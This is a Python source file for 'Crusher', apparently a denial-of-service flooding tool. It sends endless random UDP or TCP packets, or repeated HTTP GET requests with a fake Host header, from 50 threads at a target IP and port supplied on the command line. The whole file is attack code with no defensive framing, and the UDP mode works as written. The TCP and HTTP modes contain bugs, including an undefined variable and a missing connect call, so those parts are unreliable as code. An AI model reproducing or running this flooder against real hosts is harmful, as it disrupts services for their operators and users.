import socket # for Connection
import sys # for Args
import random # for Packets
import threading # ?

usage = """
Crusher - v1.1
Usage: 
       python3 Crusher.py <IP> <PORT> <MODE>
Modes:
       udp - UDP Mode
       tcp - TCP Mode
       http - HTTP Mode


Github <https://github.com/Paxv28/Crusher>
Copyright (c) 2020, Paxv28, All rights reserved.
"""
try:
    ip = sys.argv[1] # Set Target IP
    port = sys.argv[2] # Set Target Port
except IndexError:
    pass

def udp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP Socket
    packet = random._urandom(1024) # Packets
    while True:
        try:
            s.sendto(packet, (ip, int(port)))
            print("[#] Attacking %s %s" %(ip, port))
        except:
            print("[!] No Connection, server may be down")
            break
    sys.exit(0)

def tcp():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP Socket
    packet = random._urandom(1024) # Packets
    while True:
        try:
            s.sendto(packet, (ip, int(port)))
            print("[#] Attacking %s %s" %(ip, port))
        except:
            print("[!] No Connection, server may be down")
            break
    sys.exit(0)

def http():
    fake_ip = "182.21.20.32" # Don't make you anonymous
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
            print("[#] Attacking %s %s" %(ip, port))
        except:
            print("[!] No Connection, server may be down")
            break
    sys.exit(0)
    
def main():
    if 'udp' in sys.argv[3]:
        for i in range(50):
            th = threading.Thread(target=udp)
            th.start()
            
    elif 'tcp' in sys.argv[3]:
        for i in range(50):
            th = threading.Thread(target=tcp)
            th.start()
            
    elif 'http' in sys.argv[3]:
        for i in range(50):
            th = threading.Thread(target=http)
            th.start()
    
    else:
        print(usage)
    
if len(sys.argv) < 4:
    print(usage)

else:
    main()
